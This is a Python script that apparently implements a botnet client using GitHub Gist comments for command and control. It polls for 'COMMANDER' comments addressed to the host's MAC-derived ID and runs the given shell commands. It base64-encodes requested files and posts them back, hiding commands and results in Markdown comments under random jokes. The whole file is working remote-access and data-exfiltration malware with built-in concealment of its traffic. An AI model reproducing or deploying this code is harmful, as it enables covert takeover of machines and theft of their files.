import base64
import json
import re
import sys
import time
from datetime import datetime
import requests
import uuid
import subprocess

GITHUB_TOKEN = 'PUT_YOUR_TOKEN_HERE'

headers = {
    "Authorization": "token " + GITHUB_TOKEN
}


def get_gist_comments(gistID):
    url = f"https://api.github.com/gists/{gistID}/comments"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        comments = response.json()
        return comments


def find_gist():
    wait = True
    while wait:
        url = 'https://api.github.com/gists'
        gist_id = None
        latest_created_at = ""
        print("fetching gists")
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            gists = response.json()
            if len(gists) > 0:
                gist_id = gists[0]["id"]
                latest_created_at = datetime.strptime(gists[0]['created_at'], "%Y-%m-%dT%H:%M:%SZ")
                wait = False
            else:
                print("waiting for a gist")
                time.sleep(10)
            for gist in gists:
                if datetime.strptime(gist['created_at'], "%Y-%m-%dT%H:%M:%SZ") > latest_created_at:
                    gist_id = gist["id"]
                    latest_created_at = datetime.strptime(gist['created_at'], "%Y-%m-%dT%H:%M:%SZ")

    return gist_id, latest_created_at


def generate_random_joke():
    response = requests.get(
        'https://v2.jokeapi.dev/joke/Any?blacklistFlags=nsfw,religious,political,racist,sexist,explicit&format=txt')
    if response.status_code == 200:
        return response.content.decode("utf-8")
    else:
        return "Sorry I don't know any jokes"



def file_to_base64(filepath):
    try:
        with open(filepath, 'rb') as file:
            file_content = file.read()
            base64_bytes = base64.b64encode(file_content)
            base64_string = base64_bytes.decode('utf-8')
            return base64_string
    except:
        return "NO SUCH FILE WAS FOUND"


def base64_to_file(base64_string, filepath):
    base64_bytes = base64_string.encode('utf-8')
    file_content = base64.b64decode(base64_bytes)
    with open(filepath, 'wb') as file:
        file.write(file_content)


def execute_shell_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode("utf-8")


def create_gist_comment(gistID, comment_text):
    url = f"https://api.github.com/gists/{gistID}/comments"
    data = {
        "body": comment_text
    }
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 201:
        print(comment_text)
    else:
        print("Failed to create comment")
    return response


def create_comment_message(original_message):
    hidden_message = f"[//]: # \"{original_message}\"\n"
    return hidden_message


def write_comment_joke(hidden):
    joke = generate_random_joke()
    return hidden + joke


def update_comment(url, content):
    payload = {
        'body': content,
    }
    print(content)
    response = requests.patch(url, json=payload, headers=headers)


def extract_comment(comment):
    pattern = r'"([^"]*)"'
    matches = re.finditer(pattern, comment)
    # Iterate over the matches
    messages = []
    for match in matches:
        # Extract the matched text
        matched_text = match.group()
        messages.append(matched_text)
    return messages


def get_heart_beat_comment_id(gistID, myID):
    comments = get_gist_comments(gistID)
    for comment in comments:
        extracted = extract_comment(comment["body"])
        if len(extracted) >= 3:
            if extracted[0] == "\"BOT:HEARTBEAT\"":
                if extracted[1] == f"\"{myID}\"":
                    return comment


def send_heart_beat(gistID, myID):
    comment = get_heart_beat_comment_id(gistID, myID)
    dt_string = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    newHeartBeat = create_comment_message("BOT:HEARTBEAT") + create_comment_message(myID) + create_comment_message(
        dt_string)
    if comment is not None:
        print('Session exists')
        data = comment["body"]
        chunks = data.split('\n')
        original_joke = ""
        for i in range(3, len(chunks)-1):
            original_joke += chunks[i] + "\n"
        original_joke += chunks[len(chunks)-1]
        commentBody = newHeartBeat + original_joke
        update_comment(comment["url"], commentBody)
    else:
        print('New session')
        commentBody = write_comment_joke(newHeartBeat)
        create_gist_comment(gistID, commentBody)


def send_command_comment(gistID, myID, commentID, command):
    returned_value = execute_shell_command(command)
    commentBody = create_comment_message(f"BOT:EXEC:{command}") + create_comment_message(myID) + create_comment_message(
        commentID) + create_comment_message(returned_value)
    commentBody = write_comment_joke(commentBody)
    print(commentBody)
    return create_gist_comment(gistID, commentBody)


def send_file_comment(gistID, myID, commentID, command):
    file_path = command[3:]
    text = file_to_base64(file_path)
    commentBody = create_comment_message(f"BOT:EXEC:{command}") + create_comment_message(myID) + create_comment_message(
        commentID) + create_comment_message(text)
    commentBody = write_comment_joke(commentBody)
    return create_gist_comment(gistID, commentBody)


if __name__ == '__main__':
    GIST_ID = ""
    LAST_CHECKED_COMMENT = None
    MY_ID = hex(uuid.getnode())

    while True:
        gist_id, latest_created_at = find_gist()
        if gist_id != GIST_ID:
            print(f"Setting up new gist id {gist_id} with time {latest_created_at}")
            GIST_ID = gist_id
            LAST_CHECKED_COMMENT = latest_created_at

        send_heart_beat(GIST_ID, MY_ID)
        comments = get_gist_comments(GIST_ID)
        unprocessed_comments = []
        unprocessed_comments_ids = []
        for comment in comments:
            if datetime.strptime(comment['created_at'], "%Y-%m-%dT%H:%M:%SZ") > LAST_CHECKED_COMMENT:
                messages = extract_comment(comment["body"])
                if len(messages) >= 3:
                    if messages[0] == "\"COMMANDER\"" and messages[1] == f"\"{MY_ID}\"":
                        print(f"Found command for me: {messages[2]}")
                        unprocessed_comments.append(messages[2])
                        unprocessed_comments_ids.append(comment["id"])
                        LAST_CHECKED_COMMENT = datetime.strptime(comment['created_at'], "%Y-%m-%dT%H:%M:%SZ")

        print("I am going to execute following commands")
        print(unprocessed_comments)
        for i in range(len(unprocessed_comments)):
            command = unprocessed_comments[i]
            command_text = command[1:-1]
            print(f"executing {command_text}")

            if command_text.startswith("cp"):
                response = send_file_comment(GIST_ID, MY_ID, unprocessed_comments_ids[i], command_text)
            else:
                response = send_command_comment(GIST_ID, MY_ID, unprocessed_comments_ids[i], command_text)

            if response.status_code == 201:
                print('Command executed succesfully')

        print('Cleaning commands')
        unprocessed_comments = []
        unprocessed_comments_ids = []

        # Wait for 10 seconds before contacting the API again
        time.sleep(10)
